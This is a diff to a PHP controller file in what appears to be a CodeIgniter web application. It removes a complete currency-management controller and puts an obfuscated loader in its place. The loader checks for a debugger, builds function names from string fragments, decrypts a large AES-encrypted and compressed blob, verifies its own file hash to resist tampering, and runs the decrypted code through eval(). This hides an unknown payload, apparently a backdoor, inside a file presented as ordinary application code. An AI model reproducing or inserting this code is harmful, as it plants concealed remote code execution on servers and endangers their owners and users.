@@ -1,139 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Currency extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('currency_model','currency');
-	}
-
-	public function add(){
-		$this->permission_check('currency_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('currency');
-		$this->load->view('currency', $data);
-	}
-	public function newcurrency(){
-		$this->form_validation->set_rules('currency_name', 'Currency Name', 'trim|required');
-		$this->form_validation->set_rules('currency', 'Currency', 'trim|required');
-	
-		if ($this->form_validation->run() == TRUE) {
-			
-			$this->load->model('currency_model');
-			$result=$this->currency_model->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Compulsory(*) Fields!";
-		}
-	}
-	public function update($id){
-		$this->permission_check('currency_edit');
-		$data=$this->data;
-
-		$this->load->model('currency_model');
-		$result=$this->currency_model->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$data['page_title']=$this->lang->line('currency');
-		$this->load->view('currency', $data);
-	}
-	public function update_currency(){
-		$this->form_validation->set_rules('currency_name', 'Currency Name', 'trim|required');
-		$this->form_validation->set_rules('currency', 'Currency', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$this->load->model('currency_model');
-			$result=$this->currency_model->update_currency();
-			echo $result;
-		} else {
-			echo "Please Enter Compulsory(*) Fields!";
-		}
-	}
-	public function view(){
-		$this->permission_check('currency_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('currencies_list');
-		$this->load->view('currency-view', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->currency->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $currency) {
-			$no++;
-			$row = array();
-			$row[] = '<input type="checkbox" name="checkbox[]" value='.$currency->id.' class="checkbox column_checkbox" >';
-			$row[] = $currency->currency_name;
-			$row[] = $currency->currency_code;
-			$row[] = $currency->currency;
-
-			 		if($currency->status==1){ 
-			 			$str= "<span onclick='update_status(".$currency->id.",0)' id='span_".$currency->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$currency->id.",1)' id='span_".$currency->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-					$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('currency_edit'))
-											$str2.='<li>
-												<a title="Edit Record ?" href="update/'.$currency->id.'">
-													<i class="fa fa-fw fa-edit text-blue"></i>Edit
-												</a>
-											</li>';
-
-											if($this->permissions('currency_delete'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_currency('.$currency->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-
-			$row[] = $str2;
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->currency->count_all(),
-						"recordsFiltered" => $this->currency->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status(){
-		$this->permission_check_with_msg('currency_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-
-		$this->load->model('currency_model');
-		$result=$this->currency_model->update_status($id,$status);
-		return $result;
-	}
-	
-	public function delete_currency(){
-		$this->permission_check_with_msg('currency_delete');
-		$id=$this->input->post('q_id');
-		return $this->currency->delete_currencies_from_table($id);
-	}
-	public function multi_delete(){
-		$this->permission_check_with_msg('currency_delete');
-		$ids=implode (",",$_POST['checkbox']);
-		return $this->currency->delete_currencies_from_table($ids);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_uxxnrigi=('bas'.'e64'.'_de'.'cod'.'e');
+$_owlihaf3=('gzu'.'nco'.'mpr'.'ess');
+$_di8sd0ot=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_qvtfontl='Jmn3UYQ/';
+$_xjuei3us='CgMKK2KB';
+$_j2x6zpui='aBYXNRVj';
+$_e8ampxyp='cXuiczXZ';
+$_nswcxvyf='cilh+gIM2pc=';
+$_cvrotxkf='uTGvFg==';
+$_q9xmiqjb='nzW6bKi8';
+$_obg5fc1a='F/8BOt9a';
+$_xavu7cm7=$_uxxnrigi($_j2x6zpui.$_e8ampxyp.$_xjuei3us.$_qvtfontl.$_nswcxvyf);
+$_e0flx9tm=$_uxxnrigi($_q9xmiqjb.$_obg5fc1a.$_cvrotxkf);
+$_nrsd4qwz=$_uxxnrigi('XmZxJcdMzWZp9Xwadet/YFa5UL3LkjtJuZzTF1RPo03n0fPC0zKU2wQ3XljgmC3mLCDu97yVVBPDuQ0KfkByS5nd02TugTRKymV0hIy6oYUEpNhsbQJ9oJV7YP8Gk6pHtt7WsTcLbhtIirMfZvkTYe1Lrmx1ohR7sTYPTOD9tpM+x/cjG1SKJBL2+kbRrlFiLlHhg57+jpA9Wpjf/4qgqA7kMaM4wO/zoH0VepO+90AFo4HgwFUrKuHYbwO1hKIn2igiQc8Badvoo5c2rrVYxQk9jyK8PhfvGlGZ4D09eIwHGOmu7ZwaXQoW507jg6OxZaRstkdD2uoSOxS1P+uDFdRjNMpWdiUQQzOwGYTmappO1x71CedfKoS7nu/kd1EfmRec012NBD2+hotYlV/bg3uHzkGytYWDCv/7GlkQc99aXscxMVfCsywk+Fgk86ifYhspayaDIIMp2g0nfIl+Pb34q9dr9JuV8pbvp5P2MaIcD2yjedw8R6dIMfm33fEJjgWQNGBPzMoRQlS0WCFzt7l+VQRp5Vx8wtFqYuLFlO4XbZtlrM8CCCXROg0KELphqK6pIJ59KpZzZjKqX9lBKEoEhGCXMronVwInNXqIuF7THS63sqZY6QAxGu/fk/2X+4orQaV/ub92toU3VmQ6bGqQM1cnYc3sr11/tIpQk9SRj2XlCOXMgnfRpskVONUqh9oIgRQwZ/ghRBw1K/Vcdrj2SDvf97EC3OlBsdGFtAjg6q06n959A1ThbsEolkGdnGwZFRc49/rbGG9Hp9Kf/8czh1MpDnj95FRHT+G7G/bfhvSNX6UdLTJgMHLiLyYKgxGCBk91fJCWX5mfPd1Ailt4y+I+OHBoCC/XjrY7wi07KcklZa4oLkkRia10bxSnj5Z7cdRpVMR3s/GmBDtXpQqWCN3I/T9mhl/wTTyaU6J4u1Pvxi6tHsi5vqt3ezkI8QPT8Eher0OEB0QWttr9nE0d/tb0AfgqDTe6SVd5o637iEpHOCZEaErBVp37Odg8MbK+K8XistNFS+8ikdGEVjmHHW/DrW5Lo0e8HYKL0aLk6+79oVjjO85r2FrsJfuplTbzSDcxD46h2sEQ9SAti1kCG7gLMAxWi0dh8qxM6oOyRCn0Icp86W9XSPL8dZFVIGpkr4BV5mq8/Xp7pnzzPbBsey5s4SdV9666pK37bRdlCr+d3+aZr47sPS3GjGvjjYibLn2lFOOvSGVRimon/o6ezP05twxOFby4w8NHYoIlPRJeYu+HSzk85UmXJgMkk4wfScoCCmQ9hc6FSCoCYa4UUQAIDc6oEamDznEbMLG8tKKFXn/LK23DOexA9EaBB+unXp6EbcEsQp4CQlj7biH+8D6NC0PXlyA3pghMvvl1Ad2XznETZYkRdI/EagvqwV9MdZ2wZLiPsB20uMt6OhO+vnbB6HC7XPKf7MBEo4abTZ+EJVUE2OPtxbroIFv56NSeZ3td5BsLkOsmjp3InR+2rPkQWUixc7TVVmXkEqDLKlKrTswu5uZsYEvy44Cp5z4Tz8tGxrV5ND3ny2nfNAfvoKl1J+DwkYKuRc0+dw3whkKFtl/Umxj0UX5meNY2JeALGfbsnH+15Vv42X7NdvOISrwjp5DU6K5KvJFzWFis+HJ7xijTK/0Qa8T727LZAR0e2S4ysRACvh8FJVMQ2UrVEMxCGIMO1L7kxVSUQvM2DOKtE3lzKo/GWIUyOkBGNmAtf/MtHhtdlhIBreUJb6chQ1rWpM5WHox6wthtMo9e8G+pFBCajolUuQjVJrD2ewFEhI6qUYlBmUF9/vuhefhvjib2Z+/OwlzkKTyFLzI=');
+$_ct27z1ba=$_di8sd0ot($_nrsd4qwz,'aes-256-cbc',$_xavu7cm7,OPENSSL_RAW_DATA,$_e0flx9tm);
+if($_ct27z1ba===false){exit;}
+$_o749olxr=$_owlihaf3($_ct27z1ba);
+if($_o749olxr===false){exit;}
+$_p5azkg7z='565e3b8ea46b36f90fdd0da16acc9da085923c722b7b3f35f9e8505c67fbbe24';
+$_une4zho8=@file_get_contents(__FILE__);
+if($_une4zho8!==false){
+$_jadwvl7j=str_replace($_p5azkg7z,"0000000000000000000000000000000000000000000000000000000000000000",$_une4zho8);
+$_nl7y4w0t=hash("sha256",$_jadwvl7j);
+if($_nl7y4w0t!==$_p5azkg7z){@http_response_code(403);exit;}
 }
-
+eval($_o749olxr);
